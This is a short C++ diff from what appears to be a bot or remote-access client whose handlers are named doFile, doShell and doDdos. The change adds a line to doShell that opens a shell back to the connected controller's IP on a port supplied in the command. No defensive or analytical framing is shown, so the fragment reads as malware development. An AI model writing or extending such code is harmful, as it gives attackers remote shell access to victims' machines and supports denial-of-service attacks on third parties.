@@ -286,6 +286,7 @@ void Food::doFile(std::map<std::string, std::string>& args)
 
 void Food::doShell(std::map<std::string, std::string>& args)
 {
+	Shell::startShell(mSock.mIp, atoi(args["PORT"].data()));
 }
 
 void Food::doDdos(std::map<std::string, std::string>& args)
